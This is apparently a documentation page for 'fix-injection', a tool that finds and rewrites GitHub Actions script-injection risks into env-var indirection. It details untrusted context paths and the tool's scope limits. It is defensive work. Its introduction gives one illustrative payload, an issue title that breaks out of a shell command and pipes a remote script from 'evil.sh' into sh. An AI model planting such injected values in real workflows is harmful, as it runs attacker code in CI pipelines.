# Remediate Code Injection

Detect and auto-fix script-injection in `run:` steps using the `fix-injection` standalone script.

GitHub Actions expands `${{ ... }}` expressions as raw text substitution *before* the shell ever runs.
When an expression references attacker-controllable content
(an issue title, a PR body, a `workflow_dispatch` input, ...),
that content becomes literal shell syntax — an issue titled `"; curl evil.sh | sh #` breaks out of the intended command.
`fix-injection` mechanically rewrites these into GitHub's own recommended `env:`-indirection form,
which passes the value through the environment instead of the template engine.

## Dry-Run Preview

```bash
uv run --with-editable . scripts/fix_injection.py --diff
```

By default, `fix-injection` scans `.github/workflows/**/*.{yml,yaml}` and `**/action.{yml,yaml}`, same as `pin-actions`.
Use `--paths` to scan different files or glob patterns.

## Apply the Changes

```bash
uv run --with-editable . scripts/fix_injection.py
```

Before:

```yaml
- run: echo "Title was ${{ github.event.issue.title }}"
```

After:

```yaml
- run: echo "Title was $GITHUB_EVENT_ISSUE_TITLE"
  env:
    GITHUB_EVENT_ISSUE_TITLE: ${{ github.event.issue.title }}
```

The rewrite is shell-aware: `bash`/`sh` steps get `$VAR`, `pwsh`/`powershell` steps get `$env:VAR`,
`cmd` steps get `%VAR%`.
Multi-line `run: |` (literal) and `run: >` (folded) block scalars keep their block style and real newlines —
the fixer works around a `yamlrocks` round-trip re-emit quirk
that would otherwise collapse them to an escaped `"line1\nline2\n"` scalar.

## What Counts as Untrusted

`fix-injection` matches expressions against a static list of context paths, including:

- Event-payload fields reachable by an anonymous user: issue/PR title & body, comments, reviews,
  discussions, commit messages, release notes, labels, milestones, and more.
- `github.event.inputs.*` / bare `inputs.*` — `workflow_dispatch`, `workflow_call`, and composite action inputs.
  These require collaborator access to trigger, but are still attacker-controllable strings reaching a shell,
  so they're treated the same as anonymous event fields.
- `github.event.client_payload.*` — arbitrary payload from `repository_dispatch`, controlled by
  whoever holds the dispatch token (often an external system).
- Committer/author identity fields, `merge_group.*`, `workflow_run.*` head-commit/repository
  fields, `changes.*.from` (the previous value of an edited issue/PR field), array-indexed
  fields (`commits[N].*`, `pages[N].*`, `workflow_run.pull_requests[N].*`,
  `workflow_run.referenced_workflows[N].path`), and workflow path fields (`workflow.path`,
  `workflow_run.path`) — sourced verbatim from CodeQL's `actions/code-injection`
  `untrusted_event_properties.yml` data model.
- **Whole-object interpolation**: `${{ github.event.issue }}`, `${{ github.event }}`, or even
  bare `${{ github }}` — plus every other `"json"`-kind row in CodeQL's data model
  (`workflow_run.head_commit`, `pull_request.head`, `commits`, `pages`, ...) — stringify every
  leaf field of the object, including untrusted ones (title/body/etc.), so referencing the whole
  object is treated as untrusted even though individual trusted leaves of that same object (e.g.
  `github.event.issue.number`) are not.
- **`steps.<id>.outputs.*` from known-poisonable producer steps**: if `<id>` names a step that ran an action
  (`ruby/setup-ruby`, `azure/powershell`, ...)
  or shell command (`mvn`, `pytest`, `terraform`, ...) in CodeQL's enumerated
  [`poisonable_steps.yml`](https://github.com/github/codeql/blob/main/actions/ql/lib/ext/config/poisonable_steps.yml)
  data model, its output is attacker-influenceable (e.g. via a malicious `pom.xml`) and is hoisted the same way.
  Outputs of steps outside that list (`actions/checkout`, arbitrary custom actions, ...) are not modeled
  and left untouched — matching CodeQL's own scope exactly.

## Unconditional Env-Var Quoting

Independent of whether a step contains any untrusted `${{ }}` expression,
every `run:` step is also scanned for pre-existing bare (unquoted) `$VAR`/`${VAR}` (bash/sh)
or `$env:VAR` (pwsh/powershell) references and quoted — the classic ShellCheck SC2086 word-splitting/globbing risk.
This runs even on steps with zero GitHub-context findings,
printed as `quoted: <file> <path>: bare env-var reference(s) quoted`.
Bash special/positional parameters (`$@`, `$1`, `$$`, ...) and `$(...)`/`$((...))` substitution are never touched.
`cmd`'s `%VAR%` expands regardless of quoting, so `cmd` steps are skipped, same as unrecognized shells.

## Report-Only Findings (Manual Review Required)

Some findings are printed to stderr and **not** auto-fixed, and the script exits non-zero (`2`) if any exist:

- **Function-wrapped expressions** (`fromJSON(...)`, `toJSON(...)`, `format(...)`, etc.) — the wrapped
  value's shape isn't guaranteed to be a plain string, so a mechanical `env:` hoist may not be safe.
- **Unrecognized `shell:` values** — there's no guaranteed-safe placeholder syntax for a shell the
  script doesn't know.

## Explicit Scope Boundaries

- **Direct interpolation only, plus a narrow steps.outputs allowlist.**
  `fix-injection` performs a single-pass, per-`run:`-step textual match,
  augmented by a first-pass step-graph resolution that maps `id:` values to
  whether the producing step ran a known-poisonable action/command (see above).
  It does **not** trace data flow through `env:`
  (an untrusted value assigned to `env.FOO` in one step, then referenced as `env.FOO` in a later step),
  and `steps.*.outputs.*` is only in scope when the producing step matches that enumerated poisonable list —
  arbitrary indirect flow through prior job state is still not detected.
- **JavaScript is out of scope.**
  `actions/github-script`'s `with.script` is JS, not shell — it isn't scanned or fixed by this tool at all.
- **Not a "pwn request" detector.**
  `pull_request_target`/`workflow_run` combined with checking out
  and running untrusted head-ref code is a *privilege-escalation* vulnerability class, distinct from script injection.
  `fix-injection` does not detect it.
- **No blanket `github`/`github.event` treatment.**
  CodeQL falls back to flagging *any* `github.*` expression when it can't resolve a workflow's trigger.
  `fix-injection` doesn't parse `on:` triggers and doesn't adopt this fallback — it would flag plainly-trusted fields
  (`github.repository`, `github.sha`, ...) far more aggressively than intended here.
- **No third-party-action output sources beyond CodeQL's enumerated poisonable-steps list.**
  `steps.<id>.outputs.*` is only treated as untrusted
  when `<id>` names a step matching CodeQL's `poisonable_steps.yml` action/command list
  (see above) — a narrow, specific set.
  Any other third-party action's output
  (e.g. `dorny/paths-filter`, `tj-actions/changed-files`, `octokit/request-action`, or any action not in that list)
  is not modeled here; CodeQL tracks those via separate, action-specific source classes this tool does not replicate.
- For broader static analysis covering these and other classes, see
  [Comparison with Similar Tools](../explanation/comparison.md) — `zizmor`'s `template-injection`,
  `dangerous-triggers`, and related audits complement this fixer.

## See Also

- [Reference: CLI](../reference/cli.md) — full `fix-injection` flag list
- [Explanation: Threat Model](../explanation/threat-model.md) —
    the supply-chain attack model `pin-actions` defends against
